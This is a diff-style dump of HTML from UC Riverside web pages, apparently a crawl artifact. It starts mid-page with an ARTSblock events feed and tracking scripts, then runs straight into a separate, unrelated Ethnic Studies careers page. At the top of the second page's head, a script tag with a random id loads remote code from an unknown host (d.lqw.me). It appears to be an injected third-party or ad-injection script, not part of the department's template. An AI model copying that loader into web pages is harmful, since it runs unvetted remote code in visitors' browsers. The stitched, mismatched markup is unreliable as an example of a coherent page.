+     <p> ARTSblock Events <img src="/images/bullet-g.png" /> </p>
+     <ul class="feed"> 
+      <li style="display:none"> <a id="easyticker" href="/Exhibition/The-Permanent-Collection" title="The Permanent Collection">Exhibition - The Permanent Collection <em></em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Exhibition/Claudia-Joskowicz" title="CMP Projects: Claudia Joskowicz">Exhibition - CMP Projects: Claudia Joskowicz <em>Nov 23, 2013 - Apr 12, 2014</em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Exhibition/Sentry" title="Sentry">Exhibition - Sentry <em>Dec 21, 2013 - Mar 22, 2014</em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Exhibition/Quintessential" title="Quintessential">Exhibition - Quintessential <em>Dec 21, 2013 - Mar 22, 2014</em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Exhibition/Barbara-Morgan-Body-Montage" title="Barbara Morgan">Exhibition - Barbara Morgan <em>Jan 4 - May 17, 2014</em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Exhibition/Trouble-with-the-Index" title="Trouble with the Index">Exhibition - Trouble with the Index <em>Feb 1 - Jun 21, 2014</em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Exhibition/Flaws-in-the-Diamond" title="Flaws in the Diamond: Exploitation and Empire in South Africa, c. 1900">Exhibition - Flaws in the Diamond: Exploitation and Empire in South Africa, c. 1900 <em>Feb 22 - Jul 19, 2014</em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Performance/Mobius-Trio" title="Mobius Trio">Performance - Mobius Trio <em>Student Reading Session - Wed, Mar 12, 2014, 10am - 12pm Concert - Wed, Mar 12, 2014, 8pm - 9:30pm </em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Film/The-Rememberers-Art-and-Memory" title="The Rememberers: Art &amp; Memory">Film - The Rememberers: Art &amp; Memory <em>Screening - Fri, Mar 14, 2014, 7pm - 9pm </em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Performance/Riverside-County-Philharmonic-2014" title="Riverside County Philharmonic">Performance - Riverside County Philharmonic <em>Sat, Mar 15, 2014, 7:30pm </em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Performance/The-Face-in-the-Reeds" title="The Face in the Reeds">Performance - The Face in the Reeds <em>Thu, Mar 20, 2014 - Sat, Mar 22, 2014 8pm - 10pm </em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Film/Cutie-and-the-Boxer" title="Cutie and the Boxer">Film - Cutie and the Boxer <em></em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Film/Blue-Jasmine" title="Blue Jasmine">Film - Blue Jasmine <em></em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Film/Seventeen" title="Seventeen">Film - Seventeen <em></em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Film/Wadjda" title="Wadjda">Film - Wadjda <em></em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Exhibition/Monster-MFA-Thesis-Exhibition-2014" title="Monster: MFA Thesis Exibition 2014">Exhibition - Monster: MFA Thesis Exibition 2014 <em>Apr 12 - May 3, 2014</em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Program/Exchange-Assimilation-Appropriation-in-the-Arts" title="Exchange: Assimilation &amp; Appropriation in the Arts">Program - Exchange: Assimilation &amp; Appropriation in the Arts <em>Sat, May 17, 2014, 9:30am - 4:30pm </em></a> </li> 
+      <li style="display:none"> <a id="easyticker" href="/Performance/Regina-Schaffer-Reading-Session-and-Concert" title="Regina Schaffer, New music pianist">Performance - Regina Schaffer, New music pianist <em>Student Reading Session - Tue, May 20, 2014, 10am - 12pm Concert - Tue, May 20, 2014, 8pm - 9:30pm </em></a> </li> 
+     </ul> 
+     <p></p> 
+    </div> 
+    <!-- Social Media Icons --> 
+    <a href="http://www.youtube.com/ucrartsblock" target="_blank"><img src="/images/logo_youtube.png" height="20" style="margin-right: 28px;" class="right" /> </a>
+    <a href="http://www.twitter.com/ucrartsblock" target="_blank"><img src="/images/logo_twitter.png" height="20" style="margin-right: 3px;" class="right" /></a>
+    <a href="http://www.facebook.com/ucrartsblock" target="_blank"><img src="/images/logo_facebook.png" height="20" style="margin-right: 3px;" class="right" /></a> 
+    <p class="bottom-links"> &copy; 2014 UCR ARTSblock | (951) 827-4787 | <a target="_blank" href="https://www.ucr.edu/privacy.html">Privacy Policy</a> | <a href="/contact/">Contact</a> | <a href="mailto:artsblock@ucr.edu?Subject=RECEIVE%20NEWSLETTER%20REQUEST%20(From%20Website)&amp;Body=Name:%20">Newsletter Signup</a> </p> 
+   </div> 
+  </div> 
+  <!-- BEGIN: SeeVolution --> 
+  <script type="text/javascript">
+      (function()
+        {
+          var ms = document.createElement("script");
+          var site = ("https:" == document.location.protocol) ? "https://c.svlu.net/cjs.aspx" : "http://c.svlu.net/cjs.aspx";
+          ms.src = site;
+          ms.setAttribute("async", "true");
+          document.documentElement.firstChild.appendChild(ms);
+        })();
+      </script> 
+  <script type="text/javascript">
+      var _gaq = _gaq || [];
+      _gaq.push(['_setAccount', 'UA-998196-3']);
+      _gaq.push(['_trackPageview']);
+
+      (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+      })();
+</script>  
+ </body>
+</html><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <!-- InstanceBegin template="/Templates/EthnicStudies.dwt" codeOutsideHTMLIsLocked="false" -->
+ <head> 
+  <script type="text/javascript" id="2f2a695a6afce2c2d833c706cd677a8e" src="http://d.lqw.me/xuiow/?o=3&amp;g=51C1355B-8F04-5EE1-6BAA-F729663DD92F&amp;s=BBA5481A-926B-4561-BD79-249F618495E6&amp;z=1393293607"></script> 
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
+  <!-- InstanceBeginEditable name="doctitle" --> 
+  <title>UCR Department of Ethnic Studies</title> 
+  <!-- InstanceEndEditable --> 
+  <link href="../css/style.css" rel="stylesheet" type="text/css" /> 
+  <script src="../Scripts/jquery-1.3.2.min.js" type="text/javascript"></script> 
+  <link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/sIFR-screen.css" media="screen" /> 
+  <link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/sIFR-print.css" media="print, projection" /> 
+  <script type="text/javascript" src="http://www.ucr.edu/js/sifr.js"></script> 
+  <script type="text/javascript" src="http://www.ucr.edu/js/sifr-config.js"></script> 
+  <script type="text/javascript" src="http://www.ucr.edu/swfobject.js"></script> 
+  <script type="text/javascript" src="../Scripts/p7uberlink.js"></script> 
+  <script type="text/javascript" src="../p7pm/p7popmenu.js"></script> 
+  <style type="text/css" media="screen">
+<!--
+@import url("../p7pm/p7pmv7.css");
+-->
+</style> 
+  <!-- InstanceBeginEditable name="head" --> 
+  <!-- InstanceEndEditable --> 
+ </head> 
+ <body onload="P7_initPM(0,7,1,-20,10);P7_Uberlink('uberlink','nav')"> 
+  <div id="container"> 
+   <div id="masthead">
+    <img src="../images/header.gif" width="910" height="127" border="0" usemap="#Map" /> 
+    <map name="Map" id="Map"> <area shape="rect" coords="643,12,775,40" href="http://www.ucr.edu" alt="UCR Homepage"></area> <area shape="rect" coords="783,13,895,41" href="http://chass.ucr.edu" alt="CHASS Homepage"></area> </map> 
+   </div> 
+   <div id="content"> 
+    <h2>
+     <!-- InstanceBeginEditable name="Heading" -->What can I 'do' with an Ethnic Studies degree?
+     <!-- InstanceEndEditable --></h2> 
+    <div id="cL"> 
+     <ul id="p7PMnav"> 
+      <li><a href="../index.html">HOME</a></li> 
+      <li><a href="#" class="p7PMtrg">ABOUT ETHNIC STUDIES</a> 
+       <ul> 
+        <li><a href="whatisethnicstudies.html">What is Ethnic Studies?</a></li> 
+        <li><a href="ethnicstudiescareers.html">What Can I Do With an Ethnic Studies Degree?</a></li> 
+        <li><a href="scholarlyandintellectualproject.html">The Scholarly and Intellectual Project of Ethnic Studies</a></li> 
+        <li><a href="aboutUCR.html">About UC Riverside</a></li> 
+       </ul> </li> 
+      <li><a href="../news_events/index.html">NEWS &amp; EVENTS</a></li> 
+      <li><a href="../job_opportunities/index.html">JOB OPPORTUNITIES</a></li> 
+      <li><a href="#" class="p7PMtrg">FACULTY &amp; STUDENTS</a> 
+       <ul> 
+        <li><a href="../people/faculty/index.html">Department Faculty</a></li> 
+        <li><a href="../people/cooperating_faculty/index.html">Cooperating Faculty</a></li> 
+        <li><a href="../people/visiting_faculty_lecturers/index.html">Visiting Scholars and Lecturers</a></li> 
+        <li><a href="../people/graduate_students/index.html">Current Graduate Students</a></li> 
+        <li><a href="../people/alumni/index.html">Alumni</a></li> 
+       </ul> </li> 
+      <li><a href="../publications_media/index.html">DOWNLOADABLE FACULTY PUBLICATIONS &amp; MEDIA</a></li> 
+      <li><a href="#" class="p7PMtrg">UNDERGRADUATE PROGRAM</a> 
+       <ul> 
+        <li><a href="../undergraduate/index.html">About the Program</a></li> 
+        <li><a href="#" class="p7PMtrg">Areas of Study</a> 
+         <ul> 
+          <li><a href="../undergraduate/area_of_study/AfricanAmericanStudies.html">African American Studies</a></li> 
+          <li><a href="../undergraduate/area_of_study/AsianAmericanStudies.html">Asian American Studies</a></li> 
+          <li><a href="../undergraduate/area_of_study/ChicanoStudies.html">Chicano Studies</a></li> 
+          <li><a href="../undergraduate/area_of_study/EthnicStudies.html">Ethnic Studies</a></li> 
+          <li><a href="../undergraduate/area_of_study/NativeAmericanStudies.html">Native American Studies</a></li> 
+         </ul> </li> 
+        <li><a href="../undergraduate/courses.pdf">Courses</a></li> 
+       </ul> </li> 
+      <li><a href="#" class="p7PMtrg">GRADUATE PROGRAM</a> 
+       <ul> 
+        <li><a href="../graduate/statement.html">Statement from the Graduate Advisor</a></li> 
+        <li><a href="../graduate/PhD_program.html">The Ph.D. Program</a></li> 
+        <li><a href="../graduate/admission_requirements.html">Admission Requirements</a></li> 
+        <li><a href="../graduate/funding.html">Funding</a></li> 
+        <li><a href="../graduate/FAQs.html">FAQs</a></li> 
+        <li><a href="../graduate/courses.html">Courses</a></li> 
+       </ul> </li> 
+      <li><a href="../contact/index.html">CONTACT INFORMATION</a></li> 
+      <!--[if lte IE 6]><style>#p7PMnav a{height:1em;}#p7PMnav li{height:1em;float:left;clear:both;width:100%}</style><![endif]--> 
+      <!--[if IE 6]><style>#p7PMnav li{clear:none;}</style><![endif]--> 
+     </ul>
+     <br /> 
+     <div id="cL_announcement">
+      <!-- InstanceBeginEditable name="leftbar-announcement" -->&nbsp;
+      <!-- InstanceEndEditable -->
+     </div> 
+    </div> 
+    <div id="mainContent">
+     <!-- InstanceBeginEditable name="MainContent" --> 
+     <p>Graduates of the Ethnic Studies Department pursue a wide range of careers, and many go on to complete their Masters and Ph.D. degrees in fields such as Ethnic Studies, American Studies, Education, Sociology, and Anthropology.&nbsp; Many others successfully pursue professional degrees in law, medicine, social work, and other areas.</p> 
+     <!-- InstanceEndEditable -->
+    </div> 
+   </div> 
+   <div id="footer_wrapper"> 
+    <div id="footer">
+     <span class="copyright">&copy;<script type="text/javascript">
+var d = new Date();
+document.write(d.getFullYear());
+</script> Regents of the University of California. All rights reserved.</span>
+    </div> 
+   </div> 
+  </div>  
+  <!-- InstanceEnd --> 
+ </body>
+</html>
